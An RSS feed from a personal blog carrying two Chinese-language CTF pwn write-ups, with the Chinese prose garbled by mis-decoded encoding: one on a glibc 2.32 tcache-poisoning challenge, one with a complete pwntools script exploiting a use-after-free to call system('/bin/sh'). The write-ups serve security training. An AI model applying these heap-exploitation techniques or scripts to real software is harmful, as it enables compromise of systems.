<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Write-Up on N0k&#39;s Den</title>
    <link>http://localhost:1313/tags/write-up/</link>
    <description>Recent content in Write-Up on N0k&#39;s Den</description>
    <generator>Hugo -- 0.147.8</generator>
    <language>en</language>
    <lastBuildDate>Thu, 08 Apr 2021 16:48:49 +0000</lastBuildDate>
    <atom:link href="http://localhost:1313/tags/write-up/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>VNCTF2021 Pwn</title>
      <link>http://localhost:1313/posts/vnctf2021/</link>
      <pubDate>Thu, 08 Apr 2021 16:48:49 +0000</pubDate>
      <guid>http://localhost:1313/posts/vnctf2021/</guid>
      <description>&lt;h6 id=&#34;ä¸€ç‚¹åºŸè¯&#34;&gt;ä¸€ç‚¹åºŸè¯&lt;/h6&gt;
&lt;p&gt;2021å¹´ä¸‰æœˆæŸä¸ªå‘¨æ—¥,å®‰æ’æœ¬æ¥æ˜¯ä¸Šåˆè¿åŠ¨,ä¸‹åˆæ‰“è¿™ä¸ªæ¯”èµ›. ç„¶è€Œç¯®çƒæ–—ç‰›è¿‡ç¨‹ä¸­è¢«å¯¹æ‰‹çˆ†äº†å¤´,æ˜äº†ä¸€æ•´å¤©,é‚å°†è¿™æ¯”èµ›é¸½äº†&amp;hellip;
è¿‡äº†ä¸€ä¸ªæœˆ,å›å¤´çœ‹ä¸‹æ¯”èµ›ä¸­çš„pwné¢˜.&lt;/p&gt;
&lt;h2 id=&#34;ff&#34;&gt;ff&lt;/h2&gt;
&lt;p&gt;glibc 2.32, éœ€è¦ç–¯ç‹‚è°ƒè¯•çš„ä¸€é“é¢˜,ä»¤äººæ˜è¿·.&lt;/p&gt;
&lt;h3 id=&#34;ç¨‹åºåˆ†æ&#34;&gt;ç¨‹åºåˆ†æ&lt;/h3&gt;
&lt;h4 id=&#34;æ¼æ´&#34;&gt;æ¼æ´&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;free&lt;/code&gt; åæŒ‡é’ˆæœªæ¸…ç©º.&lt;/p&gt;
&lt;h4 id=&#34;å‘ç‚¹&#34;&gt;å‘ç‚¹&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;æ²¡ç”¨æ•°ç»„å­˜å‚¨æŒ‡é’ˆ, åªèƒ½æ§åˆ¶ä¸Šä¸€ä¸ª&lt;code&gt;malloc()&lt;/code&gt;çš„chunk&lt;/li&gt;
&lt;li&gt;èƒ½&lt;code&gt;malloc()&lt;/code&gt;çš„æœ€å¤§å¤§å°ä¸º0x7F (ä¹‹åä¼šå‘ç°è¿™ç‚¹æŠŠæœ€ååˆ©ç”¨æ—¶ä½¿ç”¨çš„sizeå¡çš„å¾ˆæ­»)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;show()&lt;/code&gt; åªèƒ½ç”¨ä¸€æ¬¡, åº”è¯¥æ˜¯è¦æ‰“stdoutäº†&lt;/li&gt;
&lt;li&gt;&lt;code&gt;edit()&lt;/code&gt; åªèƒ½ç”¨ä¸¤æ¬¡&amp;hellip;&lt;/li&gt;
&lt;li&gt;2.32ä¸­, tcache_entry ä¸­çš„nextæŒ‡é’ˆä¼šè¢«&lt;code&gt;PROTECT_PTR&lt;/code&gt;å‡½æ•°å¼‚æˆ–å¤„ç†, ä½¿ç”¨çš„maskä¸ºå…¶åœ°å€&amp;raquo;12.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;æ€è·¯&#34;&gt;æ€è·¯&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;åˆ©ç”¨&lt;code&gt;PROTECT_PTR&lt;/code&gt;:  åˆ©ç”¨nextå€¼ä¸º0çš„chunk, å’Œ&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mask âŠ• 0 = mask
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ä»¥ä¸Šè¿™ä¸ªç‰¹æ€§, &lt;code&gt;show()&lt;/code&gt;æ³„éœ²å‡º mask. maskå­˜æ”¾ç€ å †åœ°å€ &amp;raquo; 12. &lt;code&gt;show()&lt;/code&gt;æ¬¡æ•°ç”¨å°½.&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;
&lt;p&gt;é€šè¿‡UAFæ¼æ´, &lt;code&gt;edit()&lt;/code&gt;ä¿®æ”¹&lt;code&gt;tcache_entry&lt;/code&gt;ä¸­çš„keyå€¼. &lt;code&gt;tcache_entry&lt;/code&gt;ä½¿ç”¨ç”¨æˆ·chunkä¸­çš„ç”¨æˆ·æ•°æ®,keyå°±åœ¨æ‰€è°“bkæŒ‡é’ˆçš„ä½ç½®. ä¿®æ”¹å®Œkeyå€¼,å°±å¯ä»¥ç»•è¿‡æ£€æŸ¥è¿›è¡Œ&lt;code&gt;double free()&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;é€šè¿‡&lt;code&gt;edit()&lt;/code&gt;åš&lt;code&gt;tcache poisoning&lt;/code&gt;, åŠ«æŒåˆ°&lt;code&gt;tcache_perthread_struct&lt;/code&gt;. éœ€æ³¨æ„tcache_entry-&amp;gt;next æŒ‡å‘çš„æ˜¯ç”¨æˆ·æ•°æ®æ®µ, å› æ­¤éœ€è¦åŠ«æŒçš„åœ°å€éœ€è¦åŠ ä¸Š0x10. è¿˜éœ€è¦ç”¨ä¹‹å‰æ³„éœ²å‡ºçš„maskå¯¹å…¶åšä¸€æ¬¡å¼‚æˆ–. &lt;code&gt;edit()&lt;/code&gt;æ¬¡æ•°ç”¨å°½.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;edit(p64(mask ^ (heap_base + 0x10))+p64(0))
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;tcache_perthread_struct&lt;/code&gt;å¤§å°ä¸º0x290, æˆ‘ä»¬æŠŠ&lt;code&gt;counts[0x290]&lt;/code&gt;è¦†ç›–æˆå¤§äºç­‰äº7,å°±èƒ½å°†å…¶é‡Šæ”¾åˆ°&lt;code&gt;unsortedbin&lt;/code&gt;ä¸­.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;éå¸¸é‡è¦çš„ä¸€ç‚¹: è®°å¾—æˆ‘ä»¬åœ¨&lt;code&gt;tcache_perthread_struct&lt;/code&gt;æ“ä½œ, è¯¥chunkè¿›å…¥&lt;code&gt;unsortedbin&lt;/code&gt;ä¸­ä¼šå¯¹&lt;code&gt;counts[]&lt;/code&gt;è¿›è¡Œæ±¡æŸ“,æˆ‘ä»¬è¦å°†å…¶æ¸…é›¶. åŒæ—¶,æˆ‘ä»¬ä¹Ÿåº”å½“ä¸ºä¹‹åçš„åˆ©ç”¨&lt;code&gt;entries[]&lt;/code&gt;çš„æ“ä½œåšå‡†å¤‡,è®¾ç½®å¯¹åº”çš„&lt;code&gt;counts[]&lt;/code&gt;å€¼ä½¿å…¶å¤§äºé›¶.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;åˆ©ç”¨&lt;code&gt;unsortedbin&lt;/code&gt;ä¸­chunkçš„åˆ†å‰²,å°†main_arenaåœ°å€å†™åˆ°&lt;code&gt;entries[ç›®æ ‡å¤§å°]&lt;/code&gt;ä¸­. é€šè¿‡partial overwrite æ‰“åˆ°&lt;code&gt;_IO_2_1_stdout_&lt;/code&gt; (éœ€è¦çˆ†ç ´,1 / 2^4).&lt;/p&gt;</description>
    </item>
    <item>
      <title>ç®€å•å †é¢˜write-up</title>
      <link>http://localhost:1313/posts/heap_writeup/</link>
      <pubDate>Thu, 04 Mar 2021 11:03:54 +0000</pubDate>
      <guid>http://localhost:1313/posts/heap_writeup/</guid>
      <description>&lt;h2 id=&#34;actf_2019_babyheap&#34;&gt;ACTF_2019_babyheap&lt;/h2&gt;
&lt;p&gt;ç»å…¸çš„notebooké¢˜ç›®ç»“æ„, å †åˆ©ç”¨å½“ä¸­æœ€ç®€å•çš„ç±»å‹&lt;/p&gt;
&lt;p&gt;æœ‰&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;
    ==============================
    This is a heap exploit demo  
    ==============================
    1. Create something           
    2. Delete something           
    3. Print something            
    4. Exit    
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;create, delete, print ä¸‰ä¸ªé€‰é¡¹ã€‚&lt;/p&gt;
&lt;p&gt;åˆ›å»ºçš„ç»“æ„ä½“å¦‚ä¸‹&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;/th&gt;
          &lt;th&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;å­—ç¬¦ä¸²æŒ‡é’ˆ&lt;/td&gt;
          &lt;td&gt;å‡½æ•°æŒ‡é’ˆ&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;å­—ç¬¦ä¸²ä¹Ÿç”±&lt;code&gt;malloc()&lt;/code&gt;åˆ›å»ºï¼Œä¸”å¯ä»¥ä»»æ„æŒ‡å®šå…¶é•¿åº¦å’Œå†…å®¹ã€‚
&lt;code&gt;free()&lt;/code&gt;çš„æ—¶å€™ä¹Ÿæ²¡æœ‰æ¸…ç©ºå†…å®¹ã€‚&lt;/p&gt;
&lt;p&gt;åˆ©ç”¨æ€è·¯å¾ˆæ˜æ˜¾äº†ï¼š
createä¸¤æ¬¡ï¼Œå…¶ä¸­å­—ç¬¦ä¸²çš„å†…å®¹ä¸é‡è¦ï¼Œåªè¦ä¿è¯å…¶é‡Šæ”¾åä¸è¢«æ”¾å…¥&lt;code&gt;0x20&lt;/code&gt;çš„fastbinä¸­ã€‚&lt;/p&gt;
&lt;p&gt;æ­¤å¤„ä½¿è¿™è¿™ä¸¤ä¸ªå­—ç¬¦ä¸²å¤§å°ä¸º&lt;code&gt;0x20&lt;/code&gt;ï¼Œå› æ­¤ä»–ä»¬è¢«é‡Šæ”¾åä¼šè¢«æ”¾å…¥&lt;code&gt;0x30&lt;/code&gt;çš„å­—ç¬¦ä¸²å½“ä¸­ã€‚&lt;/p&gt;
&lt;p&gt;é‡Šæ”¾è¿™ä¸¤ä¸ªnoteä¹‹åçš„fastbinå¦‚ä¸‹&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;0x20&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;note0&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;ğŸ —&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;note1&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;0x30&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;String0&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;ğŸ —&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;String1&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;å†æ¬¡create,ä½†ç”³è¯·çš„å­—ç¬¦ä¸²å¤§å°ä¸º0x10ï¼ˆchunkå¤§å°å³ä¸º0x20ï¼‰ã€‚fastbinæ˜¯FILO(first in last out)çš„ï¼Œé‚£ä¹ˆ&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;    note2 = note1
    string2 = note0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;é¢˜ç›®bssæ®µä¸­è´´å¿ƒçš„å‡†å¤‡äº†&lt;code&gt;/bin/sh&lt;/code&gt;å­—ç¬¦ä¸²ï¼Œä¹Ÿæœ‰&lt;code&gt;system&lt;/code&gt;å‡½æ•°ã€‚
åœ¨createæ—¶å‘string2ä¸­å†™å…¥&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;    binshåœ°å€ |  systemçš„PLTè¡¨åœ°å€
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;printé€‰é¡¹è°ƒç”¨note0.å‡½æ•°æŒ‡é’ˆï¼Œå°±èƒ½æˆåŠŸè°ƒç”¨&lt;code&gt;system(&#39;/bin/sh&#39;)&lt;/code&gt;ï¼Œå®Œæ•´payloadå¦‚ä¸‹&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;    if len(sys.argv) &amp;gt;1 and sys.argv[1] == &amp;#39;r&amp;#39;:
        target = remote()
    else:
        target = process(&amp;#34;./ACTF_2019_babyheap&amp;#34;)
        if(len(sys.argv)&amp;gt;1) and sys.argv[1]==&amp;#39;g&amp;#39;:
            gdb.attach(target)

    context.log_level=&amp;#39;debug&amp;#39;

    binsh=0x602010
    system_plt = 0x4007A0
    def s(in_put):
        target.sendlineafter(&amp;#34;choice: &amp;#34;,in_put)
        
        
    def create(size,content):
        s(&amp;#34;1&amp;#34;)
        target.recvuntil(&amp;#34;size: \n&amp;#34;)
        target.sendline(str(size))
        target.recvuntil(&amp;#34;content: \n&amp;#34;)
        target.send(content)
        
        
    def delete(index):
        s(&amp;#34;2&amp;#34;)
        target.recvuntil(&amp;#34;index: \n&amp;#34;)
        target.sendline(str(index))
        
        
    def pwn():
        create(0x20,&amp;#34;A&amp;#34;*8+&amp;#34;\n&amp;#34;)
        create(0x20,&amp;#34;B&amp;#34;*8+&amp;#34;\n&amp;#34;)
        
        delete(0)
        delete(1)
        create(0x10,p64(binsh)+p64(system_plt))

        #use print at index 0 to getshell after this


        target.interactive()


    pwn()
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h2 id=&#34;wdb_2018_1st_babyheap&#34;&gt;WDB_2018_1st_babyheap&lt;/h2&gt;
&lt;p&gt;åŒæ ·æ˜¯èœå•é¢˜ç›®,è®¾è®¡çš„ååˆ†å·§å¦™,æ¶‰åŠåˆ°äº†å¾ˆå¤šå †çš„çŸ¥è¯†ç‚¹.&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
